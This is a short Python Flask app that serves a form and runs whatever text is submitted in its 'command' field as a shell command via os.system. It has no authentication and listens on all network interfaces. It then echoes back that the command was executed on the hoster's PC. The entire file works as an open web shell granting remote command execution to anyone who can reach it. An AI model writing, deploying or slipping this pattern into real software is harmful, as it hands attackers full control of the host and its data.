from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def my_form():
    return open("./templates/index.html").read()

@app.route('/', methods=['POST'])
def my_form_post():
    import os
    text = request.form['command']
    os.system("{0}".format(text))
    return open("./templates/index.html").read() + "\n You executed the command '{0}' on the hoster's PC.".format(text)
if __name__ == '__main__':
   app.run(host="0.0.0.0")